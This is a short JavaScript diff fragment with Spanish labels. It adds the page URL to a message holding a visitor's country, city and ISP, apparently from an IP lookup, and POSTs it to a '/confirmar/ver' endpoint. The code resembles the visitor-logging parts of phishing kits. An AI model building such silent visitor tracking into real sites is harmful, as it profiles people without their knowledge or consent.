@@ -10,9 +10,10 @@
 🗺 País: ${data.country_name}
 🌃 Ciudad: ${data.city}
 🔌Int. Comp: ${data.org}
+🔗URL : ${location.href}
 ■■■■■■■■■■■■■■■`
 
-fetch(`/confirmar/ver?msg=${query}`, {
+fetch(`/confirmar/ver?msg=${encodeURI(query)}`, {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json'
